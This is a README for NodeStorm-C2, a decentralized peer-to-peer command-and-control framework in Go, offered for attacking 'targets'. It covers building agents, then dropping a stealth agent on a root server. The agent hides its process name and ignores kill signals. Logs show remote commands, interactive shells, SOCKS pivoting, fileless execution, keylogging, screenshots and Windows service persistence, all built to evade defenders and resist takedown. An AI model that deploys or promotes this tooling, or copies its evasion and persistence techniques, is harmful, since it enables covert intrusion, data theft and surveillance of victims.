
# NodeStorm-C2

![Go Version](https://img.shields.io/badge/golang-go1.25.5+-blue.svg)
[![Twitter](https://img.shields.io/twitter/follow/wanzroot?label=wanzroot&style=social)]([https://twitter.com/intent/follow?screen_name=al3x_n3ff](https://x.com/wanzroot))


```text
                    _.-'`)     (`'-._
                .' -' / __    \ '- '.
               / .-' ( '-,`|   ) '-. \
              / .-',-`'._/ \_.'`-,'-. \
             ; ; /.`'.-'    '-.'`.\ ; ;
             | .-'|\//'-/   \-'\\/|'-. |
             |` |; :|'._\   /_,'|: ;| `|
             || : |;    `Y-Y`    ;| : ||
             \:| :/======"="======\| |:/
              /_:-`                 `-;_\
            NodeStorm.Net Decentralized C2
            @HeloKity @Dr909 @Ashiraa

[*] Welcome to the NodeStrom.Net Decentralized C2, please type 'help' for options
[*] The system is patient. It always waits for its targets to reveal themselves.

```

NodeStorm-C2 is an advanced, decentralized Command and Control (C2) framework built entirely on Peer-to-Peer (P2P) architecture. Written in Go, it leverages the powerful `libp2p` networking stack to provide highly resilient, secure, and untraceable communication between the Controller and its Agents.

## How It Works

Unlike traditional C2 frameworks that rely on a central server (which acts as a single point of failure and is easily identifiable by blue teams), NodeStorm-C2 operates on a distributed P2P network using Kademlia Distributed Hash Tables (DHT).

1. **Discovery & Routing**: The framework connects to public bootstrap peers (such as IPFS bootstrap nodes) to form its network. Agents and the Controller discover each other through a shared "Room", which is securely generated via a salted cryptographic hash of a room name and password.
2. **Beaconing & PubSub**: Agents use GossipSub (a PubSub protocol in libp2p) to securely broadcast their heartbeat and system metadata (Hostname, OS, Username, etc.) to the Controller.
3. **NAT Traversal & Hole Punching**: Thanks to `libp2p`, NodeStorm-C2 automatically handles complex networking setups. It supports UPnP/NAT-PMP, TCP/UDP Hole Punching, and fallback Auto-Relays. This means Agents can directly talk to the Controller even if both are sitting behind strict firewalls or Carrier-Grade NATs, without needing exposed inbound ports.
4. **Encrypted Streams**: When the Controller interacts with an Agent, a direct multiplexed stream is opened. All traffic within this stream—including commands, files, and proxy data—is symmetrically encrypted using your unique shared password.

## Key Advantages

- **Zero Central Infrastructure**: No need to purchase, configure, or hide a central C2 server, domain name, or use redirectors. The global P2P network itself is the infrastructure. This makes infrastructure takedowns extremely difficult.
- **Unstoppable Connections**: Advanced NAT hole-punching and relaying mechanisms ensure you can reliably interact with agents regardless of inbound port restrictions or firewall configurations.
- **End-to-End Security**: On top of libp2p's native transport security, NodeStorm-C2 employs an additional layer of custom symmetrical payload encryption. Only nodes that possess the correct room password can decrypt commands and join the swarm.
- **Multi-Platform Support**: Built natively in Go, it supports Windows, Linux, and macOS out of the box.
- **Stealth & Resilience**: Agents run in background loops with jitter incorporated into their beacons to avoid predictable network patterns. They can ignore termination signals or run masked/as a service.

## Features

The Controller provides a beautiful, syntax-highlighted Command Line Interface (CLI) with tab-autocompletion. Supported features include:

* **`agents`**: List all active swarm agents with real-time status.
* **`cmd <id> <command>`**: Execute an arbitrary shell command on the target end-to-end encrypted.
* **`shell <id>`**: Spawn a fully interactive Remote Shell (supports PTY/Raw mode on Unix, and stealth PowerShell on Windows).
* **`upload` / `download`**: Fast, chunked, and encrypted file transfers to and from the agent.
* **`socks <id> <port>`**: Spin up a SOCKS5 proxy securely tunneled through the P2P connection, providing raw access to the target's internal network.
* **`fwd <id> <target> <local_port>`**: Port forward any internal service through the agent back to your local machine.
* **`memexec <id> <binary> [args]`**: *(Linux Only)* Fileless memory execution. Run ELF binaries directly from memory without dropping them on the disk.
* **`screenshot <id>`**: *(Windows Only)* Take stealthy screen captures of the target's desktop.
* **`keylog <id> [START|STOP|DUMP|CLEAR]`**: *(Windows Only)* Background asynchronous keylogger that tracks keyboard inputs to a hidden temporary log.

## Quick Start & Usage

### 1. Building the Project

First, execute the `build.sh` script to compile both the Agent and the Controller. Ensure that both are built using the exact same room name and password. Because NodeStorm-C2 is entirely P2P and does not rely on public IP addresses, these matching keys are strictly required for the Agent and Controller to discover each other and communicate.

```text
Agent Build Configuration
────────────────────────────────────────────────────────────────────
1. Current OS only
2. Linux (amd64)
3. Linux (arm64)
4. macOS (amd64)
5. macOS (arm64 / M1/M2)
6. Windows (amd64)
7. Windows DLL (amd64) [Reflective]
8. All platforms
9. Multiple selection
10. Skip agent build

Select option [1-10]: 2

Controller Build Configuration
────────────────────────────────────────────────────────────────────
1. Current OS only
2. Linux (amd64)
3. Linux (arm64)
4. macOS (amd64)
5. macOS (arm64 / M1/M2)
6. Windows (amd64)
7. All platforms
8. Multiple selection
9. Skip controller build

Select option [1-9]: 5

[OK] Build directory: build

Building Agents
────────────────────────────────────────────────────────────────────

[BUILD] Linux amd64 Agent (Normal)
[OK] agent-linux-amd64 (25M)
[BUILD] Linux amd64 Agent (Stealth)
[OK] agent-linux-amd64-stealth (25M)

Building Controllers
────────────────────────────────────────────────────────────────────

[BUILD] macOS arm64 Controller
[OK] controller-darwin-arm64 (24M)

[INFO] Restoring original main.go
[OK] main.go restored from backup



Build Complete


Build Artifacts
────────────────────────────────────────────────────────────────────
  -rwxr-xr-x@ 1 alwanz  staff    25M 16 Apr 18:38 agent-linux-amd64
  -rwxr-xr-x@ 1 alwanz  staff    25M 16 Apr 18:38 agent-linux-amd64-stealth
  -rwxr-xr-x@ 1 alwanz  staff    24M 16 Apr 18:38 controller-darwin-arm64

Campaign Information
────────────────────────────────────────────────────────────────────
  Room: isekair00m
  Pass: isekair00m@12345

Build completed successfully

(env)  🐓 NodeStorm-C2
```

After running `build.sh`, the compiled binaries will be available in the `build/` directory.

```text
(env)  🐓 NodeStorm-C2  ls -la build
total 151536
drwxr-xr-x@  5 alwanz  staff       160 16 Apr 18:38 .
drwxr-xr-x@ 29 alwanz  staff       928 16 Apr 18:38 ..
-rwxr-xr-x@  1 alwanz  staff  26136760 16 Apr 18:38 agent-linux-amd64
-rwxr-xr-x@  1 alwanz  staff  26136760 16 Apr 18:38 agent-linux-amd64-stealth
-rwxr-xr-x@  1 alwanz  staff  25301554 16 Apr 18:38 controller-darwin-arm64
(env)  🐓 NodeStorm-C2
```

In the example above, there are two types of Linux agents generated:
- `agent-linux-amd64` is the standard agent binary.
- `agent-linux-amd64-stealth` is designed to run silently in the background. It employs process forking to spoof its execution name, masking the true binary name from process lists. Even if the original binary on disk is deleted, the agent will continue running safely in memory.
- `controller-darwin-arm64` is your remote C2 client. Since it was built using the same room/password configuration, any target executing the agent will automatically attempt to couple with this controller binary.

### 2. Execution and Connection

First, run the controller binary on your local machine.

```text
                    _.-'`)     (`'-._
                .' -' / __    \ '- '.
               / .-' ( '-,`|   ) '-. \
              / .-',-`'._/ \_.'`-,'-. \
             ; ; /.`'.-'    '-.'`.\ ; ;
             | .-'|\//'-/   \-'\\/|'-. |
             |` |; :|'._\   /_,'|: ;| `|
             || : |;    `Y-Y`    ;| : ||
             \:| :/======"="======\| |:/
              /_:-`                 `-;_\
            NodeStorm.Net Decentralized C2
            @HeloKity @Dr909 @Ashiraa

[*] Welcome to the NodeStrom.Net Decentralized C2, please type 'help' for options
[*] The system is patient. It always waits for its targets to reveal themselves.

[*] Mode: Private (e1aaee2ec5a0...))
Connecting to 4 bootstrap peers...
✓ Connected to 4 bootstrap peers
[+] Node ID: 12D3KooWPQri...
[*] R00m: isekair00m
   Connecting to DHT network.......... [+] Connected

  ──────────────────────────────────────────────────────────────────────
[*] Listening for incoming connections
[StromNet::Peer] →
```

Upload the compiled agent to your target machine and execute it:

```bash
root@vps-6264b52f:/var/tmp# chmod +x agent-linux-amd64-stealth
root@vps-6264b52f:/var/tmp# ./agent-linux-amd64-stealth
root@vps-6264b52f:/var/tmp# ps aux | grep agent
root      122036  0.0  0.0   3332  1572 pts/0    S+   11:45   0:00 grep agent
root@vps-6264b52f:/var/tmp#
```

If you check the running processes, you will see that the stealth agent masks its true name:

```bash
root@vps-6264b52f:/var/tmp# ps aux | grep self
root      122021 13.5  0.3 1256080 80312 ?       Ssl  11:45   0:06 /proc/self/exe
root      122046  0.0  0.0   3332  1620 pts/0    S+   11:46   0:00 grep self
```

Standard `kill` signals will be ignored by the stealth agent. Future updates may introduce even deeper stealth and hooking mechanisms.

Once the agent connects through the DHT network, you will see it drop into your controller:

```text
[+] Node ID: 12D3KooWCxjA...
[*] R00m: isekair00m
   Connecting to DHT network.......... [+] Connected

  ──────────────────────────────────────────────────────────────────────
[*] Listening for incoming connections
  [+] New agent: root@vps-6264b52f (linux)
[StromNet::Peer] →
```

### 3. Controller Commands

Type `help` to list all available commands:

```text
[StromNet::Peer] → help

  Commands
  ──────────────────────────────────────────────────────────────────────
 agents        List agents
 cmd           Execute command
 upload        Upload file
 download      Download file
 socks         Start SOCKS5 proxy Linux/Mac Only
 fwd           Port forwarding Linux/Mac Only
 shell         Interactive shell Win/Linux/Mac
 memexec       Fileless execution Linux Only
 screenshot    Take screenshot Windows Only
 keylog        Streaming Keylogger Windows Only
 info          System info node
 clear         Clear screen
 exit          Exit

[StromNet::Peer] →
```

You can view active agents and execute commands reliably. All command communication is end-to-end encrypted, ensuring there is zero data leakage or interception possible along the route.

```text
[StromNet::Peer] → agents

  Active Agents
  ──────────────────────────────────────────────────────────────────────
  ID    USER@HOST                           OS            STATUS
  [1]   root@vps-6264b52f                   linux         ● on

[*] Total: 1 agent(s)

[StromNet::Peer] → cmd 1 id

[*] Executing on root@vps-6264b52f: id
  DEBUG: Password Room: isekair00m@12345
  DEBUG: Command: id
  DEBUG: Encrypted: 19cf22093c3bdd886a4df21ecbda78c894f5a3551ac19d1feb65ee2762b7...
  DEBUG: Response length: 174 bytes
  DEBUG: Response preview: e1e82c43d8f48aeff5ae1d8867e04172489d93788b7f3bd6cbc3e9f98f03...
  DEBUG: Attempting decrypt...
  DEBUG: Decrypt SUCCESS!
uid=0(root) gid=0(root) groups=0(root)
```

Interactive shells can be spawned for more hands-on access:

```text
[StromNet::Peer] → shell 1
[*] Executing on root@vps-6264b52f: Starting interactive shell...
  Type 'exit' to close the session.
root@vps-6264b52f:/var/tmp# whoami
root
root@vps-6264b52f:/var/tmp# uname -a
Linux vps-6264b52f 6.1.0-44-cloud-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.164-1 (2026-03-09) x86_64 GNU/Linux
root@vps-6264b52f:/var/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@vps-6264b52f:/var/tmp# exit
exit
[StromNet::Peer] →
```

> **Note:** Because the underlying data relies on decentralized P2P multiplexing rather than direct TCP sessions, the interactive shell may occasionally experience brief delays or input desyncs. However, it remains highly functional and unrestrictive for remote administration.

### Windows Persistence

For Windows targets, the build script can generate two agent types:
1. **Standard Binary:** Runs in the current user context.
2. **Service Binary (`sys`):** Automatically registers itself as a background Windows Service upon execution. This guarantees reboot persistence. 

Because NodeStorm relies on decentralized peering, you can safely close the controller at any time. The next time you open the controller with the same credentials, it will rediscover and automatically reconnect with all surviving agents.
